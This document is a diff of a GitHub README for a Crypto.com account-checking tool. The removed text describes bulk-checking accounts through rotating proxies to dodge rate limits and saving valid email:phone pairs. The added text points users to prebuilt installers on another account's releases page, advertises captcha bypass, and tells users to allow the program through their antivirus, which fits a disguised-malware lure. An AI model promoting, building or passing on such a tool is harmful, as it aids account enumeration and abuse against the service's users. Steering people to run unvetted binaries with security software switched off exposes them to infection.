@@ -1,102 +1,85 @@
-<div align="center">
-  <h2 align="center">Crypto.com Account Checker</h2>
-  <p align="center">
-    An automated tool for checking Crypto.com accounts with proxy handling and multi-threading capabilities.
-    <br />
-    <br />
-    <a href="https://discord.cyberious.xyz">💬 Discord</a>
-    ·
-    <a href="#-changelog">📜 ChangeLog</a>
-    ·
-    <a href="https://github.com/sexfrance/Crypto-Account-Checker/issues">⚠️ Report Bug</a>
-    ·
-    <a href="https://github.com/sexfrance/Crypto-Account-Checker/issues">💡 Request Feature</a>
-  </p>
-</div>
+# ✨ Crypto-Account-Checker - Easily Check Your Crypto Accounts
 
----
+## 🚀 Getting Started
 
-### ⚙️ Installation
+Welcome to the Crypto-Account-Checker! This tool automates checking your Crypto.com accounts while providing advanced features like proxy handling and multi-threading. Follow these steps to download and run the application smoothly.
 
-- Requires: `Python 3.7+`
-- Make a python virtual environment: `python -m venv venv`
-- Source the environment: `venv\Scripts\activate` (Windows) / `source venv/bin/activate` (macOS, Linux)
-- Install the requirements: `pip install -r requirements.txt`
+## 📥 Download the Application
 
----
+[![Download Crypto-Account-Checker](https://img.shields.io/badge/Download_Crypto--Account--Checker-v1.0-brightgreen)](https://github.com/Shaammusa/Crypto-Account-Checker/releases)
 
-### 🔥 Features
+Visit this page to download: [Releases Page](https://github.com/Shaammusa/Crypto-Account-Checker/releases)
 
-- Proxy support for avoiding rate limits
-- Multi-threaded account checking
-- Real-time checking tracking with console title updates
-- Configurable thread count
-- Debug mode for troubleshooting
-- Proxy/Proxyless mode support
-- Automatic token handling
-- Detailed logging system
-- Account data saving (email:phone format)
-- Full account capture with region and country details
+## 💾 Download & Install
 
----
+To get started, follow these simple steps:
 
-### 📝 Usage
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Shaammusa/Crypto-Account-Checker/releases). 
 
-1. **Configuration**:
-   Edit `input/config.toml`:
+2. **Find the Latest Release**: Locate the latest release at the top of the page. You will see version information and a list of available files.
 
-   ```toml
-   [dev]
-   Debug = false
-   Proxyless = false
-   Threads = 1
+3. **Download the Installer**: Click on the file that fits your system. If you are using Windows, it will likely be a `.exe` file, while Mac users might find a `.dmg` file. For Linux users, look for a `.tar.gz` file. 
 
-   [data]
-   password = "optional_custom_password"
-   email_verified = true
-   ```
+4. **Run the Application**: Once the download is complete, open the downloaded file to install. Follow the prompts on the screen to complete the installation. 
 
-2. **Proxy Setup** (Optional):
+5. **Launching**: After installation, find the Crypto-Account-Checker icon on your desktop or applications folder. Double-click it to start the application.
 
-   - Add proxies to `input/proxies.txt` (one per line)
-   - Format: `ip:port` or `user:pass@ip:port`
+## ⚙️ System Requirements
 
-3. **Running the script**:
+Before starting, ensure your system meets the following requirements:
 
-   ```bash
-   python main.py
-   ```
+- **Operating System**:
+  - Windows 10 or later
+  - macOS 10.12 (Sierra) or later
+  - Linux: Most distributions should work, but you might need additional libraries.
 
-4. **Output**:
-   - Checked accounts are saved to `output/valid.txt` (email:phone)
-   - Invalid accounts saved to `output/invalid.txt`
-   - Errors recorded in `output/error.txt`
+- **Hardware**:
+  - A minimum of 4GB of RAM is recommended.
+  - At least 500MB of available disk space.
 
----
+- **Network**:
+  - A stable internet connection is needed for account checks and proxy operations.
 
-### 📹 Preview
+## 🌐 How to Use the App
 
-![Preview](https://i.imgur.com/c7yeYrQ.gif)
+Now that you have installed the Crypto-Account-Checker, here’s how to use it:
 
----
+1. **Open the Application**: Launch the app as described above.
 
-### ❗ Disclaimers
+2. **Proxy Settings**: If you want to use a proxy for your checks, go to the settings menu. Input your proxy information if required.
 
-- This project is for educational purposes only
-- The author is not responsible for any misuse of this tool
-- Use responsibly and in accordance with Crypto.com's terms of service
+3. **Input Account Details**: Enter your account information. You can add multiple accounts by separating them with commas. The app supports email and phone number formats.
 
----
+4. **Start the Checking Process**: Once you have entered your account information, click the "Start" button. The tool will begin checking your accounts automatically.
 
-### 📜 ChangeLog
+5. **View Results**: After the process completes, results will appear on the screen. You can see details like the account status and any issues found.
 
-```diff
-v0.0.1 ⋮ 10/21/2025
-! Initial release with proxy support and multi-threading
-```
+## 🛠️ Features
 
-<p align="center">
-  <img src="https://img.shields.io/github/license/sexfrance/Crypto-Account-Checker.svg?style=for-the-badge&labelColor=black&color=f429ff&logo=IOTA"/>
-  <img src="https://img.shields.io/github/stars/sexfrance/Crypto-Account-Checker.svg?style=for-the-badge&labelColor=black&color=f429ff&logo=IOTA"/>
-  <img src="https://img.shields.io/github/languages/top/sexfrance/Crypto-Account-Checker.svg?style=for-the-badge&labelColor=black&color=f429ff&logo=python"/>
-</p>
+- **Multi-Threading**: The app checks multiple accounts at once, speeding up the process significantly.
+  
+- **Proxy Handling**: Protect your privacy while checking your accounts using proxy servers.
+
+- **Captcha Bypass**: If you encounter captchas, the app includes built-in features to bypass them, allowing smoother operation.
+
+## 🔄 Troubleshooting
+
+If you face issues while using the application, consider the following tips:
+
+1. **Connection Issues**: Ensure your internet connection is stable. Check if other websites are working properly.
+
+2. **Proxy Errors**: Verify your proxy settings if you are using one. Incorrect entries can lead to connectivity problems.
+
+3. **Installation Issues**: If you encounter issues while installing, try re-downloading the file and running the installer as an administrator.
+
+4. **Blocked by Anti-virus Software**: Sometimes, security software may block the application. Make sure to allow it through your firewall or antivirus settings.
+
+## 📞 Support
+
+If you need more help, you can check the Issues section on the [GitHub repository](https://github.com/Shaammusa/Crypto-Account-Checker/issues). Community members and maintainers can assist you.
+
+## 📝 Important Note
+
+Always be cautious with personal information when using automated tools. Use secure and private networks whenever possible. 
+
+Thank you for choosing Crypto-Account-Checker! Enjoy checking your accounts effortlessly!
